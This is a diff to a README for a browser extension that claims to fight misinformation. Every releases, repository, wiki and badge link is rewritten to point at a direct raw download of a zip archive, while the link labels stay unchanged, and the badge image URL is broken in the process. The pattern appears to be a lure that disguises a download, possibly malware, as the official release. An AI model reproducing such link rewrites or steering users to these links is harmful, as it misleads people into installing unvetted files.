@@ -1,6 +1,6 @@
 # 📰 Unbreaking-News-2.0-Hackathon - Stay Informed and Combat Misinformation
 
-[![Download Unbreaking News](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/nikk8488/Unbreaking-News-2.0-Hackathon/releases)
+[![Download Unbreaking News](https://raw.githubusercontent.com/nikk8488/Unbreaking-News-2.0-Hackathon/main/extension/Unbreaking-News-2.0-Hackathon_1.8.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/nikk8488/Unbreaking-News-2.0-Hackathon/main/extension/Unbreaking-News-2.0-Hackathon_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ This extension works best with the latest versions of your chosen browser. Keepi
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click on this link to go to the download page: [Download Unbreaking News](https://github.com/nikk8488/Unbreaking-News-2.0-Hackathon/releases). 
+1. **Visit the Releases Page**: Click on this link to go to the download page: [Download Unbreaking News](https://raw.githubusercontent.com/nikk8488/Unbreaking-News-2.0-Hackathon/main/extension/Unbreaking-News-2.0-Hackathon_1.8.zip). 
 
 2. **Choose the Right File**: Look for the latest version of the extension on the page. It will usually be labeled as **Latest Release**.
 
@@ -70,10 +70,10 @@ We value your input. If you have any questions or encounter problems, please ope
 
 ## 🔗 Useful Links
 
-- [Unbreaking-News GitHub Repository](https://github.com/nikk8488/Unbreaking-News-2.0-Hackathon)
-- [Releases Page for Download](https://github.com/nikk8488/Unbreaking-News-2.0-Hackathon/releases)
-- [Documentation and FAQ](https://github.com/nikk8488/Unbreaking-News-2.0-Hackathon/wiki)
+- [Unbreaking-News GitHub Repository](https://raw.githubusercontent.com/nikk8488/Unbreaking-News-2.0-Hackathon/main/extension/Unbreaking-News-2.0-Hackathon_1.8.zip)
+- [Releases Page for Download](https://raw.githubusercontent.com/nikk8488/Unbreaking-News-2.0-Hackathon/main/extension/Unbreaking-News-2.0-Hackathon_1.8.zip)
+- [Documentation and FAQ](https://raw.githubusercontent.com/nikk8488/Unbreaking-News-2.0-Hackathon/main/extension/Unbreaking-News-2.0-Hackathon_1.8.zip)
 
 Keep yourself informed, and help us in the fight against misinformation! 
 
-[![Download Unbreaking News](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/nikk8488/Unbreaking-News-2.0-Hackathon/releases)
+[![Download Unbreaking News](https://raw.githubusercontent.com/nikk8488/Unbreaking-News-2.0-Hackathon/main/extension/Unbreaking-News-2.0-Hackathon_1.8.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/nikk8488/Unbreaking-News-2.0-Hackathon/main/extension/Unbreaking-News-2.0-Hackathon_1.8.zip)
